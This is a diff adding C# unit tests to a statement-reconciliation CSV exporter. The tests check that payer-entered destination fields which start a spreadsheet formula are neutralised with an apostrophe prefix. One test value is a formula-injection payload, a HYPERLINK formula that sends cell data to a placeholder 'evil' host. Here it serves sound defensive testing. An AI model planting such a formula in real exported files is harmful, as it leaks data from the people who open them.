@@ -90,6 +90,46 @@ public class StatementReconciliationDocumentTests
         csv.Should().Contain("оплата за пальне");
     }
 
+    [Theory]
+    [InlineData("=HYPERLINK(\"http://evil/?d=\"&A1)")]
+    [InlineData("+1+1")]
+    [InlineData("-1+1")]
+    [InlineData("@SUM(A1:A9)")]
+    public void A_Cell_That_Would_Be_A_Formula_In_A_Spreadsheet_Is_Defused(string payload)
+    {
+        // The destination is what the customer typed, so a payer can put a formula there - and
+        // this file is opened in a spreadsheet, by an accountant, on a machine that has the
+        // payer's URL in it. The apostrophe is Excel's own "this is text" marker: the cell reads
+        // as what the payer typed, and the spreadsheet drops the marker.
+        var csv = StatementReconciliationCsv.Render(ActWithDestination(payload));
+
+        csv.Should().Contain($"\"'{payload.Replace("\"", "\"\"")}\"");
+        csv.Should().NotContain($"\"{payload.Replace("\"", "\"\"")}\"");
+    }
+
+    [Fact]
+    public void A_Cell_That_Does_Not_Start_A_Formula_Is_Left_Alone()
+    {
+        // The defusal is a prefix, not a rewrite: a destination that says what it says must still
+        // say what it says.
+        var csv = StatementReconciliationCsv.Render(ActWithDestination("оплата за пальне 50 л"));
+
+        csv.Should().Contain("\"оплата за пальне 50 л\"");
+        csv.Should().NotContain("'оплата");
+    }
+
+    /// <summary>
+    /// The same act, with a payer-chosen destination.
+    /// </summary>
+    private static StatementReconciliationResponse ActWithDestination(string destination)
+    {
+        var act = Act();
+        return act with
+        {
+            Rows = act.Rows.Select(r => r with { Destination = destination }).ToList()
+        };
+    }
+
     // The act is read in a spreadsheet, and Excel on Windows decides a CSV's encoding from the BOM
     // alone - without it the customer's Cyrillic names arrive as mojibake in the one tool this is
     // actually opened with.
